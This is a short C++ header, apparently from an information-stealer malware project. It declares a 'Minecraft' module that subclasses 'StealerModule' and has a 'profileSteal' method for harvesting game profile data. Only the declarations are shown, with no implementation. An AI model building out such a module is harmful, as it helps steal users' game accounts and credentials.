//
// Created by .1qxz on 11.06.2024.
//

#ifndef STEALER_MINECRAFT_H
#define STEALER_MINECRAFT_H


#include "../../../StealerModule.h"
#include "../../../../entity/SharedEntity.h"
#include "json.hpp"

using json = nlohmann::json;

class Minecraft : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static void profileSteal(const fs::path &root, const fs::path &profile_path);
};


#endif //STEALER_MINECRAFT_H
